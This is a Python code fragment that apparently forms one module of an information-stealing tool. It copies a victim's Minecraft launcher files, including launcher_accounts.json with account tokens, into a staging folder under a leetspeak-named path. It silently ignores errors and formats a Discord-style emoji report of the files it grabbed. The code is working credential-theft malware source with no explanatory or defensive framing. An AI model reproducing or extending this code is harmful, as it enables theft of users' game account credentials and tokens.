class Minecraft:

    def __init__(self):
        try:
            self.files = 0
            os.mkdir(os.path.join(P4THF0LDR, "Minecraft"))
            self.minecraftfolder = os.path.join(P4THF0LDR, "Minecraft")
            path = f"C:\\Users\\{user}\\AppData\\Roaming\\.minecraft"
            self.Minycrafty(path)
        except:
            pass
    
    def Minycrafty(self, path):
        logs = ['launcher_accounts.json', 'usercache.json', 'launcher_profiles.json', 'launcher_log.txt']
        for i in logs:
            shutil.copy(path+"\\"+i,self.minecraftfolder+"\\"+i)
            self.files +=1
    
    def __repr__(self):
        return f"""
``|_`` :open_file_folder: ``Minecraft``
``|   |_``:page_facing_up: ``({self.files}) Minecraft Files``"""